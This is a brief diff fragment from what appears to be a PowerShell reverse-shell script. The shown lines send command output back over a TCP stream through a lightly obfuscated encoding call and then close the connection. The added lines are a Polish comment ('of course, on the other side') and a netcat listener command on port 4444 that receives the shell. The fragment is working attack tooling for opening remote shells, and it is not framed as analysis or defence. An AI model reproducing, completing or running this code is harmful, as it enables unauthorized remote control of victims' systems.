@@ -8,3 +8,7 @@ $sendbyte = ([text.encoding]::$bypass).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()};
 $client.Close()
+
+
+# oczywiście po drugiej stronie
+nc -nlvp 4444 
